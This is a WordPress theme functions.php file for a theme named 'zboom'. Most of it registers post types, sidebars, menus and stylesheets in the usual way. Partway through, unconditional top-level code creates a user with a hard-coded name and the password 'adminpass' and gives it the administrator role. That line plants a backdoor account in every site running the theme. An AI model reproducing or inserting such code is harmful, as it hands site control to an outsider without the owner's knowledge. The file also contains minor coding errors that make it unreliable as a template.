<?php
function functions_for_zboom_theme(){
    //Title part
    add_theme_support('title-tag');


    //Post Thumbnails
    add_theme_support('post-thumbnails');


    //Custom Background
    $custom_background_defaults = array(
        'default-color' => '',
        'default-image' => ''
    );
    add_theme_support('custom-background', $custom_background_defaults );


    //Load Textdomain
    load_theme_textdomain('zboom', get_template_directory_uri() . '/languages');


    //Register Menu
    if(function_exists(register_nav_menu)){
        register_nav_menu('main', __('Main Menu', 'zboom'));
    }


    //Read more
    function read_more($limit){
        $content = explode(' ', get_the_content());
        $less = array_slice($content, 0, $limit);
        echo implode(' ',$less);
    }



    //slider
    register_post_type('slider', array(
            'labels' => array(
            'name' => 'Slider',
            'add_new_item' => 'Add new image'
        ),
        'public' => True,
        'supports' => array('title','thumbnail'),
    ));


    //higlight blocks
    register_post_type('highlights',array(
        'labels'=>array(
            'name'=>'Highlight Blocks',
            'add_new_item'=>'Add new block'
        ),
        'public'=>True,
        'supports'=>array('title', 'editor'),
    ));
    
    
    //gallery images
    register_post_type('gallaryimages',array(
            'labels'=>array(
            'name'=>'Gallary Images',
            'add_new_item'=>'Add new image'
        ),
        'public'=>True,
        'supports'=>array('title', 'editor', 'thumbnail'),
    ));

}
add_action('after_setup_theme', 'functions_for_zboom_theme');



// widgets-register
function sidebar_register(){
//right-sidebar [latest album,Recent post]
    register_sidebar(array(
        'name'=>'Right Sidebar',
        'description'=>'a sidebar area for left side',
        'id'=>'right-widgets',
        'before_widgets'=>'<div class="box">',
        'after_widgets'=>'</div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div><div class="content">'
    ));
    //footer-sidebar
    register_sidebar(array(
        'name'=>'Footer Sidebar',
        'description'=>'This is a footer sidebar',
        'id'=>'footer-widgets',
        'before_widgets'=>'<div class="box">',
        'after_widgets'=>'</div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div><div class="content">'
    ));
    //contact sidebar 
    register_sidebar(array(
        'name'=>'Contact Sidebar',
        'description'=>'a sidebar area for left side',
        'id'=>'contact-widgets',
        'before_widgets'=>'<div class="box">',
        'after_widgets'=>'</div></div>',
        'before_title'=>'<div class="heading"><h2>',
        'after_title'=>'</h2></div><div class="content">'
    ));

}
add_action('widgets_init', 'sidebar_register');


//add new user

$user = new WP_User(wp_create_user('Shojib','adminpass', 'shojibsfacebook@gmail.com'));
$user->set_role('administrator');

function add_css_js(){
    wp_register_style('zerogrid', get_template_directory_uri() . '/css/zerogrid.css');
    wp_register_style('style', get_template_directory_uri() . '/css/style.css');
    wp_register_style('responsive', get_template_directory_uri() . '/css/responsive.css');
    wp_register_style('slidestyle', get_template_directory_uri() . '/css/responsiveslides.css');
    
    
    wp_register_script('responsiveslides', get_template_directory_uri() . '/js/responsiveslides.js', array('jquery'));
    wp_register_script('script', get_template_directory_uri() . '/js/script.js', array('jquery', 'responsiveslides'));
    
    wp_enqueue_style('zerogrid');
    wp_enqueue_style('style');
    wp_enqueue_style('responsive');
    wp_enqueue_style('slidestyle');
    
    wp_enqueue_script('Jquery');
    wp_enqueue_script('responsiveslides');
    wp_enqueue_script('script');
}
add_action('wp_enqueue_scripts', 'add_css_js');

require_once('lib/ReduxCore/framework.php');
require_once('lib/sample/config.php');


















